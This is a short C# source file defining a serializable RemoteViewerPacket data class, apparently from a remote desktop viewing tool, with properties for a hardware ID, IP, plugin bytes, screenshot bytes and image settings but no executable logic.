using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RemoteViewerPacket : IPacket
    {
        public RemoteViewerPacket(PacketType packetType) : base()
        {
            this.PacketType = packetType;
        }

        public RemoteViewerPacket(PacketType packetType, string baseIp, string HWID) : base()
        {
            this.PacketType = packetType;
            this.BaseIp = baseIp;
            this.HWID = HWID;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public byte[] desktopPicture { get; set; }
        public int height { get; set; }
        public int width { get; set; }
        public int quality { get; set; }
        public string format { get; set; }
        public int timeMS { get; set; }

        public int vResol { get; set; }
        public int hResol { get; set; } 
    }
}
